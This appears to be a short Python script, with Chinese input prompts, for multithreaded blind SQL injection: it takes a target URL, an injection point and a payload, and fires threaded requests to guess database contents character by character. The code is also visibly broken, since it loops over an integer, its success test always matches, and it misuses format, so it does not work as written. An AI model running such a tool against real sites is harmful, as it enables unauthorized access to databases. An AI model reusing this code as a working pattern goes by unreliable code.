import requests
import queue
import threading
import warnings
warnings.filterwarnings("ignore")
result=int(input("输入查找长度"))
url = input("输入url及注入点")
data=input("输入注入语句")
def fun(url,result,result2):
    for i in result2:
        reponse=requests.get(url+data.format(result,result2))
        if '' in reponse.text:
            print(result,url+format(result,result2),chr(result2))
            break
for  i in range(1,150):
    t=threading.Thread(target=fun,args=(url,i,result))
    t.start()